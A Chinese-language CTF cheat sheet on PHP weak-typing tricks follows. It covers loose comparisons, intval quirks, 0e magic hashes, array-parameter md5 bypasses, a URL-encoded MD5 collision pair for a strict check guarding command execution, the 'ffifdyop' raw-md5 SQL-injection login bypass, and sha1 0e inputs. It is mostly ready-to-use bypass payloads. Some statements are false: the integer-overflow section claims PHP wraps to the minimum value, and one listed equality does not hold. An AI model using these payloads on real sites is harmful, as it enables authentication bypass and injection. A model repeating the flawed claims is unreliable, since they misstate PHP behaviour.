## **php弱类型：**
<https://www.cnblogs.com/linfangnan/p/13411103.html>
**类型相等判断**
PHP 比较 2 个值是否相等可以用 “ == ” 或 “ === ”，“ == ” 会在比较时自动转换类型而不改变原来的值，因此这个符号经常出现漏洞。“ == ” 比较相等的一些常见值如下，当某些语句的判断条件是使用 “ == ”来判断时，就可以使用弱类型来替代。值得一提的是 “0e” 开头的哈希字符串，PHP 在处理哈希字符串时会把每一个以 “0E” 开头的哈希值都解释为 0。

```
'' == 0 == false == "0"
"00" == true
'123' == 123
'abc' == 1 == true  常见于字符串判断相等。
'123a' == 123
'123);// ' == 123
'0x01' == 1
'0e12346789' == '0e987654321'
[false] == [0] == [NULL] == ['']
NULL == false == 0
true == 1

'1%2b2' == 1
'1+2' == 1
intval(1+2) == 3
intval("1+2") == 1
intval(" '1000' ") == 0
echo intval([0])  // 1 传一个数组永远为1

intval科学计数返回前面，科学计数后有+好返回字符串拼接后值。
intval(2019e1) == 2019
intval(2019e1+1) == 20191 

echo intval(0x117c,0) // 输出10进制4476  
第二个参数默认base是10，如果 base 是0则通过检测 var 的格式来决定使用的进制： 
◦ 如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，  
◦ 如果字符串以 "0" 开始，使用 8 进制(octal)；否则，  
◦ 将使用 10 进制 (decimal)。 

intval(010574,0) //返回值为4476
intval(+010574,0) //返回值为4476

intval(4476.1,0) //返回值为4476
intval(4476.10,0) //返回值为4476

intval(0) == 'flag字符串'
intval(aaa123) == 'flag字符串'
intval(false) == 'flag字符串'
intval(md5(phpinfo())) == '字符串' == 0  字母开头
```

如果遇到了 “===” 则不会进行类型转换，但也并不代表无从下手。如果条件表达式中含有函数，也可以通过**传入数组**让函数返回 NULL 使得条件满足。



^
## **md5判断**
**弱绕过**
```
if(md5($_POST['md51']) == md5($_POST['md52']) 
     && $_POST['md51'] != $_POST['md52'])
```
方法1：

PHP 在处理哈希字符串时，“0e” 开头的值利用 “==” 判断相等时会被视为 0。所以如果两个不同的密码经过哈希以后，其哈希值都是以 ”0E” 开头的，那么 PHP 将会认为他们相同。
md5(QNKCDZO)==0

md51和md52取以下两值
QNKCDZO  s155964671a  s1091221200a  240610708
方法2：
数组绕过，原理是 md5() 等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过。
?md51[]=1&md52[]=2

^
**强绕过**
```
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
}



a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

^
**php中原值和md5(原值)后要==**
原值为0e215962017即可


^
**数据库中的MD5造成注入：**
```
select * from 'admin' where password=md5($pass,true)
```
```
<?php
$pass = "ffifdyop";
echo md5($pass,ture);  //为'or'6?]??!r,??b
?>
```
所以传入ffifdyop即可密码正确。


^
## **sha哈希**
和md5类似，

以下值在sha1加密后以oE开头：
```
sha1('aaroZmOk')
sha1('aaK1STfY')
sha1('aaO8zKZF')
sha1('aa3OFF9m')
```
^
## **php整数溢出**
PHP中整数溢出的具体值取决于系统的架构（32位还是64位）。在32位系统中，整数的范围是 -2147483648 到 2147483647，当超过这个范围时会发生溢出。在64位系统中，整数的范围是 -9223372036854775808 到 9223372036854775807。

当一个整数超过了系统所能表示的最大值，它会回绕到最小值。同样，当一个整数低于系统所能表示的最小值，它会回绕到最大值。这就是整数溢出的发生。

在PHP中，如果整数发生溢出，它不会引发错误，而是静默地产生一个新的整数值。例如，在32位系统中，如果一个整数超过了2147483647，它将回绕到-2147483648。这种行为可能导致程序逻辑错误，因此在处理较大数值时应该格外小心。
